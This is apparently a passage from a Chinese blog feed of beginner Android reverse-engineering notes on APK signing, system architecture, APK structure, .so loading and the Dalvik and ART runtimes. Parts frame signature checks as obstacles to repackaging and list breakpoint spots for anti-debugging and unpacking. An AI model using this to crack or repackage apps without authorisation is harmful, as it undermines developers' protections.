/></p><ul><li><code>MANIFEST.MF</code>：摘要文件。程序遍历Apk包中的所有文件(entry)，对非文件夹非签名文件的文件，逐个用SHA1(安全哈希算法)生成摘要信息，再用Base64进行编码</li><li><code>CERT.SF</code>：对摘要的签名文件。对前一步生成的MANIFEST.MF，使用SHA1-RSA算法，用开发者的私钥进行签名。在安装时只能使用公钥才能解密它。解密之后，将它与未加密的摘要信息(MANIFEST.MF文件)进行对比，如果相符，则表明内容没有被异常修改。</li><li><code>CERT.RSA</code>：保存了公钥、所采用的加密算法等信息，实际包含了对CERT.SF文件的数字签名以及签名时所用的platform.x509.pem这个数字证书，可以用 keytool 进行查看</li></ul><h2 id="v2-签名"><a class="markdownIt-Anchor" href="#v2-签名"></a> V2 签名</h2><p>​V2方案会将 APK 文件视为 blob，并对整个文件进行签名检查。对 APK 进行的任何修改(包括对 ZIP 元数据进行的修改)都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。</p><h2 id="签名检验"><a class="markdownIt-Anchor" href="#签名检验"></a> 签名检验</h2><p>​不做任何修改，直接签名安装，应用闪退则说明大概率有签名校验。一般来说，普通的签名校验会导致软件的闪退，黑屏，卡启动页等。</p><p>​以下是签名可能使用的一些方法</p><ul><li><code>kill/KillProcess()</code> 可以杀死当前应用活动的进程，这一操作将会把所有该进程内的资源（包括线程全部清理掉）。当然，由于ActivityManager时刻监听着进程，一旦发现进程被非正常Kill，它将会试图去重启这个进程。这就是为什么，有时候当我们试图这样去结束掉应用时，发现它又自动重新启动的原因。</li><li><code>system.exit</code> 杀死了整个进程，这时候活动所占的资源也会被释放。</li><li><code>finish</code> 仅仅针对Activity，当调用finish()时，只是将活动推向后台，并没有立即释放内存，活动的资源并没有被清理</li></ul><h1 id="challenge"><a class="markdownIt-Anchor" href="#challenge"></a> Challenge</h1><h2 id="第五关"><a class="markdownIt-Anchor" href="#第五关"></a> 第五关</h2><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><ul><li><p><a href="https://www.52pojie.cn/thread-1731181-1-1.html">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p></li><li><p><a href="https://bbs.kanxue.com/thread-278982.htm">https://bbs.kanxue.com/thread-278982.htm</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Android</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Android逆向入门(1)</title>
    <link href="/posts/d491e335.html"/>
    <url>/posts/d491e335.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>了解android</p></blockquote><h1 id="android系统架构"><a class="markdownIt-Anchor" href="#android系统架构"></a> Android系统架构</h1><p>​从下往上，Android主要有五个层次，依次为Linux内核层、HAL硬件抽象层、系统运行库层、应用框架层、应用层。HAL硬件抽象层这里不做讲述。</p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403041026255.png" alt="" /></p><h2 id="linux内核层"><a class="markdownIt-Anchor" href="#linux内核层"></a> Linux内核层</h2><p>​Android 平台的基础就是 Linux 内核，ART依靠Linux内核来执行底层功能</p><h2 id="系统运行库层"><a class="markdownIt-Anchor" href="#系统运行库层"></a> 系统运行库层</h2><h3 id="native-cc-库"><a class="markdownIt-Anchor" href="#native-cc-库"></a> Native C/C++ 库</h3><p>​与标准Linux中一样的使用C/C++编写的原生库文件，<a href="http://xn--libopengl-pz8nxy013a9vyb0m50pzja84jwuiy79g.so">包括提供媒体库支持的libopengl.so</a>、提供数据库存储功能的 libsqlite3.so等。so就相当于dll。</p><h3 id="android-runtime"><a class="markdownIt-Anchor" href="#android-runtime"></a> Android Runtime</h3><p>​这里主要包含android虚拟机(Dalvik/ART)和系统核心库。在系统运行过程中，每一个App进程都有一个自己的Android Runtime实例，用于支持所有 Java 相关代码的加载与执行。Android 5.0 后采用ART运行库，<a href="http://xn--libart-vy7i73csy8dkpfka364skp4c.so">对应的库文件为libart.so</a>。系统核心库是为 java api frameword 服务的，包含了对应的 java API 的JNI接口函数的实现。</p><h2 id="应用框架层"><a class="markdownIt-Anchor" href="#应用框架层"></a> 应用框架层</h2><p>​framework 框架层主要包含了通过java语言编写的API接口。例如：android/util/Log中实现的是一些日志打印JAVA接口，app应用程序在使用java编写的时候可以通过导入这个类并调用对应的Log接口函数，实际这个接口函数是一个native方法，其会通过JNI调用对应的接口函数(在jni/android_util_Log.cpp中)，然后此接口函数会通过syscall调用内核中对应的系统服务实现日志的相关操作。简言之，framework层相当于是一个第三方库，然后其对应接口JAVA API函数的实现都在native层(系统so库)，当android 虚拟机在执行到对应接口 API方法时就会去对应的系统so库中寻找。</p><h2 id="应用层"><a class="markdownIt-Anchor" href="#应用层"></a> 应用层</h2><p>​应用层是App所在的层级，包括系统自带的应用(称为系统应用)以及后续用户自己所安装的应用(称为普通应用)。</p><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1415759">https://cloud.tencent.com/developer/article/1415759</a></li><li><a href="https://github.com/Omooo/Android-Notes/blob/master/blogs/Android/Framework/Android%20%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84.md">https://github.com/Omooo/Android-Notes/blob/master/blogs/Android/Framework/Android 系统架构.md</a></li></ul><h1 id="android-系统启动流程"><a class="markdownIt-Anchor" href="#android-系统启动流程"></a> Android 系统启动流程</h1><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202403081112988.png" alt="" /></p><h2 id="native"><a class="markdownIt-Anchor" href="#native"></a> Native</h2><p>​主要包括init孵化来的用户空间的守护进程、HAL层以及开机动画等。启动init进程(pid=1),是Linux系统的用户进程，init进程是所有用户进程的鼻祖。</p><ul><li>init进程会孵化出 ueventd、logd、healthd、installd、adbd、lmkd 等用户守护进程；</li><li>init进程还启动 servicemanager(binder服务管家)、 bootanim(开机动画)等重要服务</li><li>init进程孵化出Zygote进程，Zygote进程是Android系统的第一个Java进程(即虚拟机进程)， Zygote是所有Java进程的父进程，Zygote进程本身是由init进程孵化而来的。</li><li>Media Server 进程<ul><li>是由 init 进程 fork 而来，负责启动和管理整个 C++ Framework，包括 AudioFlinger、Camera Service 等服务。</li></ul></li></ul><h2 id="java-framework"><a class="markdownIt-Anchor" href="#java-framework"></a> Java Framework</h2><ul><li>Zygote 进程<ul><li><p>是由 init 进程通过解析 init.rc 文件后 fork 生成的，Zygote 进程主要包括：</p></li><li><p>加载 ZygoteInit 类，注册 Zygote Socket 服务端套接字</p></li><li><p>加载虚拟机</p></li><li><p>提前加载类 preloadClasses</p></li><li><p>提前加载资源 preloadResources</p></li></ul></li><li>System Server 进程<ul><li>是由 Zygote 进程 fork 而来，System Server 是 Zygote 孵化的第一个进程，System Server 负责启动和管理整个 Java Framework，包括 ActivityManager、WindowManager、PackageManager、PowerManager 等服务。</li></ul></li></ul><h2 id="源码查看网址"><a class="markdownIt-Anchor" href="#源码查看网址"></a> 源码查看网址</h2><ul><li><a href="http://androidxref.com/">AndroidXRef</a></li><li><a href="https://www.androidos.net.cn/">Android社区 - https://www.androidos.net.cn</a></li></ul><h2 id="讲解博客"><a class="markdownIt-Anchor" href="#讲解博客"></a> 讲解博客</h2><ul><li><p><a href="https://dongxianfei.blog.csdn.net/article/details/118313822?spm=1001.2014.3001.5502">https://dongxianfei.blog.csdn.net/article/details/118313822?spm=1001.2014.3001.5502</a></p></li><li><p><a href="https://www.jb51.net/article/264671.htm">https://www.jb51.net/article/264671.htm</a></p></li><li><p><a href="https://www.fup1p1.cn/archives/androidandroid%E7%9A%84%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B">https://www.fup1p1.cn/archives/androidandroid的启动流程</a></p></li></ul><h1 id="apk-结构"><a class="markdownIt-Anchor" href="#apk-结构"></a> APK 结构</h1><h2 id="总览"><a class="markdownIt-Anchor" href="#总览"></a> 总览</h2><p>APK 的全称为  Android Package，它是使用 zip 算法压缩的文件，使用修改后缀名为 zip 即可被解压缩工具解压缩</p><table><thead><tr><th>文件</th><th>信息</th></tr></thead><tbody><tr><td>assets目录</td><td>存放APK的静态资源文件，比如视频，音频，图片等</td></tr><tr><td>lib目录</td><td>存放的.so文件是c或c++编译的动态链接库文件，它们通常用于混淆等一系列操作，增加逆向的难度。armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，</td></tr><tr><td>META-INF目录</td><td>保存应用的签名信息，签名信息可以验证APK文件的完整性，其中</td></tr><tr><td>res目录</td><td>res目录存放资源文件，包括图片，字符串等等</td></tr><tr><td>AndroidMainfest.xml文件</td><td>APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td></tr><tr><td>classes.dex文件</td><td>classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td></tr><tr><td>resources.arsc文件</td><td>resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td></tr></tbody></table><ul><li>每个app安装后，会在 <code>/data/data/&#123;apk package name&#125;/</code> 路径下生成一个安装目录，这个位置对于当前 apk 来说是可以读写的，不过对于没有root的设备，用户看不到。android高版本下，这个路径出了chach之外，其他什么都没有。android之前的版本好像还可以直接使用修改过的so替换这个目录下的so来运行，但是之后版本修改了，so直接从apk中提取了使用了</li><li>app安装后，原apk安装包会在 <code>/data/app/*.apk</code> 备份</li><li>app删除时，其安装目录和相关备份都会被删除</li></ul><h2 id="assets"><a class="markdownIt-Anchor" href="#assets"></a> assets</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>​assets 通常存储着图像、音视频、配置文件、字体、自带数据库等外部文件。应用程序在编译时不会去处理这个目录下的文件，同时在这个目录中可以创建任意目录层级关系(res就不可以)。并且它<strong>不会为里面的文件建立索引、不会限制目录层级关系、不会处理里面的文件</strong>。但是它有一个小缺陷就是它是只读的，因为在apk安装之后它被绑定在apk中，并不会解压到 <code>/data/data/&#123;apk package name&#125;/</code> 中，所以无法获得其绝对路径，也就根本不存在。</p><h3 id="开发"><a class="markdownIt-Anchor" href="#开发"></a> 开发</h3><p>​Android提供了一个 <code>android.content.res.AssetManager</code> 类来实现读取assets目录下的文件。</p><h3 id="参考-2"><a class="markdownIt-Anchor" href="#参考-2"></a> 参考</h3><ul><li>讲述 <code>android.content.res.AssetManager</code> 类的实现 -&gt; <a href="https://www.cnblogs.com/chorm590/p/11308107.html">轻读一下 Android 应用开发中的 assets 目录 - 大窟窿 - 博客园 (cnblogs.com)</a></li></ul><h2 id="res"><a class="markdownIt-Anchor" href="#res"></a> res</h2><p>​这是一种可编译的资源文件，通过 <code>R.xxx.id</code> 来访问。其中对于图像可以放在 <code>res/drawable</code> 目录或者是 <code>res/mipmap</code> 目录下。对于其它类型文件可以存放在 <code>res/raw</code> 目录下。</p><ul><li>在 <code>drawable</code> 或 <code>mipmap</code> 下只能保存图像文件或图像描述文件，但在这两个目录下保存的图像文件在编译时会建立一张&quot;索引表&quot;。这个索引信息会被统一保存在一个名称为 R.java 的文件中。在程序的任何地方都可以直接通过 <a href="http://R.drawable.xxx">R.drawable.xxx</a> 的形式来使用图片资源。</li><li><code>res/raw</code> 比较特殊。它被设计用于保存一些二进制文件，即在这个目录下的所有文件都会被记录到&quot;索引表&quot;中，但是编译系统不会去动里面的文件。raw 目录下的文件放进去时是什么样的，编译成 APK 以后还是什么样。这个目录比较适合保存一些音视频等二进制文件。</li><li>res 目录下的资源目录，都<strong>不能自由地设计子目录层级关系</strong>，不管你有多少文件，都只能放在同一级目录中。</li></ul><table><thead><tr><th>文件或目录</th><th>作用</th></tr></thead><tbody><tr><td>anim</td><td>存放动画文件</td></tr><tr><td>color</td><td>存放色彩相关文件</td></tr><tr><td>drawable</td><td>存放图像资源</td></tr><tr><td>layout</td><td>存放布局文件</td></tr><tr><td>raw</td><td>可以直接复制到设备中的任意文件</td></tr><tr><td>xml</td><td>存放任意xml文件</td></tr><tr><td>menu</td><td>布局信息</td></tr><tr><td>values</td><td>资源信息</td></tr></tbody></table><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402271239832.png" alt="img" /></p><p>​之所以有不同的 drawable 等，主要是为了让程序可以更好地兼容各种设备。</p><h2 id="lib"><a class="markdownIt-Anchor" href="#lib"></a> lib</h2><h3 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h3><p>​这个目录下的文件通常是 <code>.so</code> 文件，它是由 c/c++ 编译生成的，通常为了弥补java的弱安全性。这里涉及 JNI 和 NDK 的使用。</p><ul><li><code>JNI</code>(Java Native Interface) 是 java 的本地接口，JNI是Java调用Native 语言的一种特性，通过JNI可以使得Java与C/C<ins>机型交互。简单点说就是JNI是Java中调用C/C</ins>的统称。</li><li><code>NDK</code>(Native Develop Kit)，Android NDK 是一套允许使用 C 和 C++ 等语言，以原生代码实现部分应用的工具集。在开发某些类型的应用时，这有助于重复使用以这些语言编写的代码库。</li><li>二者没有显著的区别，相较而言：<strong>JNI可以在Java和Android中同时使用，NDK只能在Android里面使用</strong>。</li></ul><h3 id="参考-3"><a class="markdownIt-Anchor" href="#参考-3"></a> 参考</h3><ul><li>讲述 JNI 的开发 -&gt; <a href="https://zhuanlan.zhihu.com/p/97691316">Android JNI使用全面讲解 - 知乎 (zhihu.com)</a></li><li>逆向中 JNI 的利用 -&gt; <a href="https://zhuanlan.zhihu.com/p/33982945">Android逆向新手答疑解惑篇——JNI与动态注册 - 知乎 (zhihu.com)</a></li></ul><h2 id="meta-inf"><a class="markdownIt-Anchor" href="#meta-inf"></a> META-INF</h2><p>​主要关注以下三个文件</p><ul><li><code>MANIFEST.MF</code>：摘要文件。程序遍历Apk包中的所有文件(entry)，对非文件夹非签名文件的文件，逐个用SHA1(安全哈希算法)生成摘要信息，再用Base64进行编码</li><li><code>CERT.SF</code>：对摘要的签名文件。对前一步生成的MANIFEST.MF，使用SHA1-RSA算法，用开发者的私钥进行签名。在安装时只能使用公钥才能解密它。解密之后，将它与未加密的摘要信息(MANIFEST.MF文件)进行对比，如果相符，则表明内容没有被异常修改。</li><li><code>CERT.RSA</code>：保存了公钥、所采用的加密算法等信息，实际包含了对CERT.SF文件的数字签名以及签名时所用的platform.x509.pem这个数字证书，可以用 keytool 进行查看</li></ul><h3 id="参考-4"><a class="markdownIt-Anchor" href="#参考-4"></a> 参考</h3><ul><li>介绍数字签名相关知识 -&gt; <a href="https://blog.csdn.net/lewif/category_5877975.html?spm=1001.2014.3001.5482">android-security_lyf5231的博客-CSDN博客</a></li></ul><h2 id="androidmainfestxml"><a class="markdownIt-Anchor" href="#androidmainfestxml"></a> AndroidMainfest.xml</h2><h3 id="简介-2"><a class="markdownIt-Anchor" href="#简介-2"></a> 简介</h3><p>​这个文件中包含了APP的配置信息，系统需要根据里面的内容运行APP的代码，显示界面。它包含了应用的包名，版本号，权限信息，所有的四大组件等信息。在逆向的过程中，通过 apk 的清单文件，我们可以了解应用的一些基本信息，程序的入口 Activity，注册的服务，广播，内容提供者等等。</p><p>​它定义了应用程序中包含的Activity,Service,Content provider和BroadcastReceiver组件信息。每个应用程序在根目录下必须包含一个AndroidManifest.xml文件，且文件名不能修改。它描述了package中暴露的组件，他们各自的实现类，各种能被处理的数据和启动位置。</p><table><thead><tr><th style="text-align:left">属性</th><th style="text-align:left">定义</th></tr></thead><tbody><tr><td style="text-align:left">versionCode</td><td style="text-align:left">版本号，主要用来更新，例如:12</td></tr><tr><td style="text-align:left">versionName</td><td style="text-align:left">版本名，给用户看的，例如:1.2</td></tr><tr><td style="text-align:left">package</td><td style="text-align:left">包名，例如：com.zj.wuaipojie</td></tr><tr><td style="text-align:left">uses-permission android:name=“”</td><td style="text-align:left">应用权限，例如：android.permission.INTERNET 代表网络权限</td></tr><tr><td style="text-align:left">android:label=“@string/app_name”</td><td style="text-align:left">应用名称</td></tr><tr><td style="text-align:left">android:icon=“@mipmap/ic_launcher”</td><td style="text-align:left">应用图标路径</td></tr><tr><td style="text-align:left">android:debuggable=“true”</td><td style="text-align:left">应用是否开启debug权限</td></tr></tbody></table><h3 id="参考-5"><a class="markdownIt-Anchor" href="#参考-5"></a> 参考</h3><ul><li>详细分析文件各个字段 -&gt; <a href="https://www.jianshu.com/p/3b5b89d4e154">AndroidManifest.xml详解 - 简书 (jianshu.com)</a></li><li>从二进制角度分析文件格式 -&gt; <a href="https://zhuanlan.zhihu.com/p/66800574">Android逆向笔记 —— AndroidManifest.xml 文件格式解析 - 知乎 (zhihu.com)</a></li></ul><h2 id="classesdex"><a class="markdownIt-Anchor" href="#classesdex"></a> classes.dex</h2><h3 id="简介-3"><a class="markdownIt-Anchor" href="#简介-3"></a> 简介</h3><p>​这个文件包含了程序的所有代码。这里Android 并不直接使用 Class 文件，而是将所有的 Class 文件聚合打包成 <strong>DEX</strong> 文件(Dalvik可执行文件，smali语法)，DEX 文件相比单个单个的 Class 文件更加紧凑，可以直接在 Android Runtime 下执行。下面是一个dex文件的例子。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!---声明实现应用部分可视化界面的 Activity，必须使用 AndroidManifest 中的 &lt;activity&gt; 元素表示所有 Activity。系统不会识别和运行任何未进行声明的Activity。-----&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;@string/app_name&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>  <span class="hljs-comment">&lt;!--当前Activity是否可以被另一个Application的组件启动：true允许被启动；false不允许被启动--&gt;</span><br>    <span class="hljs-comment">&lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span>  <br>        <span class="hljs-comment">&lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span>  </span><br><span class="hljs-tag">                <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span>  <br>        <span class="hljs-comment">&lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">category</span>  </span><br><span class="hljs-tag">                  <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span>  <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;false&quot;</span> /&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">activity</span>  </span><br><span class="hljs-tag">          <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;</span>  <br></code></pre></td></tr></table></figure><ul><li>SDK(软件开发工具包)，软件开发工具包一般都是一些软件工程师为特定的软件包、软件框架、硬件平台、操作系统等建立应用软件时的开发工具的集合。简单讲，就是通过第三方服务商实现产品功能的软件工具包。也就是说，它就是为了开发而提供的一系列工具的集合，其中 <code>build-tools</code> 目录下的 <code>dx</code> 工具可以将 <code>.cladd</code> 转化为 DEX文件。</li></ul><h3 id="参考-6"><a class="markdownIt-Anchor" href="#参考-6"></a> 参考</h3><ul><li>DEX文件格式解析 -&gt; <a href="https://zhuanlan.zhihu.com/p/66800634">Android逆向笔记 —— DEX 文件格式解析 - 知乎 (zhihu.com)</a></li></ul><h2 id="resourceasrc"><a class="markdownIt-Anchor" href="#resourceasrc"></a> resource.asrc</h2><p>​这个文件是APK打包过程中的产生的一个资源索引文件。存储着实际资源路径或资源值，可以通过资源索引(<code>R.drawable.xxx</code>、<code>R.layout.xxx</code>、<code>R.string.xxx</code>等，存储在 <code>R.jar</code> 或 <code>R.java</code> 文件中)在该文件中查找资源。</p><ul><li>文件结构分析 -&gt; <a href="https://zhuanlan.zhihu.com/p/262000709">一文读懂resource.arsc文件结构 - 知乎 (zhihu.com)</a></li></ul><h1 id="apk-流程"><a class="markdownIt-Anchor" href="#apk-流程"></a> APK 流程</h1><h2 id="apk-打包过程"><a class="markdownIt-Anchor" href="#apk-打包过程"></a> APK 打包过程</h2><ol><li>除了assets和res/raw资源被原封不动打包进APK外，其他资源都被编译为二进制xml，所以解压apk后，无法直接打开xml文件；</li><li>除了asserts资源之外，其他资源都会被赋予一个资源ID；</li><li>打包工具负责编译和打包资源，编译完成后，会生成一个resources.arsc文件和一个R.java，前者为资源索引表，后者为各个资源ID常量，提供在代码中索引资源；</li><li>应用配置文件AndroidManifest.xml同样会被编译成二进制XML文件，再打包进APK；</li><li>应用程序在运行时通过AssetManager或资源ID或文件名访问资源；</li><li>直接解压后，会发现打不开xml文件，因为其已经变成二进制xml了；</li></ol><h2 id="apk-安装过程"><a class="markdownIt-Anchor" href="#apk-安装过程"></a> APK 安装过程</h2><ol><li>将APK安装包复制到 <code>/data/app</code> 下，校验APK签名是否正确，检查APK结构是否正常；</li><li>解压并校验APK中的 dex 文件，确定 dex 文件没有被损坏，将 dex 优化成 <code>odex</code> ，使得应用程序启动时间加快；</li><li>在 <code>/data/data</code> 目录下建立与APK包名同名的文件夹;</li><li>若APK中存在lib库，系统会判断这些so库的名字，查看是否以lib开头，以.so结尾，根据CPU的架构解压对应so库到 <code>/data/data/packagename/lib</code> 下；</li></ol><ul><li>优化后的obex结构如下：<ul><li>odex文件头(添加了一些数据)</li><li>dex文件</li><li>依赖库(新增)</li><li>辅助数据(新增)</li></ul></li></ul><h2 id="so-加载流程"><a class="markdownIt-Anchor" href="#so-加载流程"></a> so 加载流程</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202402281502132.png" alt="image-20240228150220010" /></p><p>linker的调用流程：</p><ol><li>在do_dlopen中通过find_library进行加载so</li><li>在加载完so后通过call_constructors完成init_array的加载</li><li>find_library最后调用load_libray完成so的转载</li><li>最后通过load_library的elf_reader.load完成so的装载</li></ol><table><thead><tr><th style="text-align:left">函数名</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>android_dlopen_ext()</code> 、<code>dlopen()</code>、<code>do_dlopen()</code></td><td style="text-align:left">这三个函数主要用于加载库文件。<code>android_dlopen_ext</code> 是系统的一个函数，用于在运行时动态加载共享库。与标准的 <code>dlopen()</code> 函数相比，<code>android_dlopen_ext</code> 提供了更多的参数选项和扩展功能，例如支持命名空间、符号版本等特性。</td></tr><tr><td style="text-align:left"><code>find_library()</code></td><td style="text-align:left"><code>find_library()</code> 函数用于查找库，基本的用途是给定一个库的名字，然后查找并返回这个库的路径。</td></tr><tr><td style="text-align:left"><code>call_constructors()</code></td><td style="text-align:left"><code>call_constructors()</code> 是用于调用动态加载库中的构造函数的函数。</td></tr><tr><td style="text-align:left"><code>init</code></td><td style="text-align:left">库的构造函数，用于初始化库中的静态变量或执行其他需要在库被加载时完成的任务。如果没有定义<code>init</code>函数，系统将不会执行任何动作。需要注意的是，<code>init</code>函数不应该有任何参数，并且也没有返回值。</td></tr><tr><td style="text-align:left"><code>init_array</code></td><td style="text-align:left"><code>init_array</code>是ELF(Executable and Linkable Format，可执行和可链接格式)二进制格式中的一个特殊段(section)，这个段包含了一些函数的指针，这些函数将在<code>main()</code>函数执行前被调用，用于初始化静态局部变量和全局变量。</td></tr><tr><td style="text-align:left"><code>jni_onload</code></td><td style="text-align:left">这是Android JNI(Java Native Interface)中的一个函数。当一个native库被系统加载时，该函数会被自动调用。<code>JNI_OnLoad</code>可以做一些初始化工作，例如注册你的native方法或者初始化一些数据结构。如果你的native库没有定义这个函数，那么JNI会使用默认的行为。<code>JNI_OnLoad</code>的返回值应该是需要的JNI版本，一般返回<code>JNI_VERSION_1_6</code>。</td></tr></tbody></table><p>下断点时机：<br />应用级别的：java_com_XXX；<br />外壳级别的：JNI_Onload，.init，.init_array(反调试);<br />系统级别的：fopen，fget，dvmdexfileopen(脱壳)；</p><h1 id="虚拟机相关"><a class="markdownIt-Anchor" href="#虚拟机相关"></a> 虚拟机相关</h1><h2 id="虚拟机"><a class="markdownIt-Anchor" href="#虚拟机"></a> 虚拟机</h2><h3 id="jvm虚拟机"><a class="markdownIt-Anchor" href="#jvm虚拟机"></a> JVM虚拟机</h3><p>​JVM是java虚拟机，运行java字节码程序。为了可以跨平台运行(不同的平台寄存器数量设置有不同)，JVM采用基于栈的方式构建，没有寄存器，指令集都是由栈来存储中间数据。</p><p>​Google 公司参考 java 虚拟机设计了用于Android平台的虚拟机，它是面向Linux、嵌入式操作系统的虚拟机，主要负责生命周期管理、堆栈管理、安全和线程管理、垃圾回收等。Android虚拟机分为<strong>Dalvik虚拟机</strong>和<strong>ART虚拟机</strong>。Android虚拟机是<strong>基于寄存器</strong>的指令集，这使得 Android 虚拟机性能更好、执行更高效。每个进程对应一个虚拟机。</p><h3 id="dalvik"><a class="markdownIt-Anchor" href="#dalvik"></a> Dalvik</h3><p>​采用动态编译，一句一句边运行边翻译</p><h3 id="art"><a class="markdownIt-Anchor" href="#art"></a> ART</h3><p>​采用静态编译，执行前全部被翻译为机器码</p><h2 id="android-发展"><a class="markdownIt-Anchor" href="#android-发展"></a> Android 发展</h2><h3 id="android-11"><a class="markdownIt-Anchor" href="#android-11"></a> Android 1.1</h3><p>​Dalvik：解释器。采用采用的是边编译，边执行。每次执行代码，都需要 Dalvik 将代码转化为机器指令集合，然后交给 CPU 去执行。</p><h3 id="android-22"><a class="markdownIt-Anchor" href="#android-22"></a> Android 2.2</h3><p>​Dalvik：解释器+JIT(just-in-time)。执行过程中，每遇到一个新的类别，都会被编译优化成相当精简的原生型指令码，下次执行到相同逻辑的时候，速度就会更快。最开始指在执行前编译，但是到现在已经发展成为，一开始解释执行，只有被多次调用的程序段才被编译，编译后存放在内存中，下次直接执行编译后的机器码。</p><p>​JIT 编译产生的机器指令保存在内存中，不会进行持久化存储，所以应用每次启动都会重新进行编译。</p><h3 id="android-44"><a class="markdownIt-Anchor" href="#android-44"></a> Android 4.4</h3><p>​ART(Android RunTime)：Art 采用的是 AOT 模式，AOT(Ahead-of-time)即在应用安装的时候，dex 文件就会被预编译成可执行文件。</p><p>​具体过程，安装 APK 的时候调用 dex2oat，把 dex 文件编译 oat 文件并保存到磁盘中，该文件采用的是成 ELF 文件格式，机器可以直接运行的格式，每次应用启动不用重新编译。所以每次应用启动的时候，启动速度有很大提升，增加了存储空间的使用，也是一种空间换时间的策略，但是安装过程中耗时增加。Android 5.0 之后系统虚拟机彻底切换为 ART 虚拟机。</p><h3 id="android-70"><a class="markdownIt-Anchor" href="#android-70"></a> Android 7.0</h3><p>​AOT+解释执行+JIT：为了解决在 ART 上的安装时间太长的问题，同时保证在启动 APP 的时候性能不变，从 android7.0 开始采用混合模式，即 <strong>AOT+JIT+解释执行</strong> 3 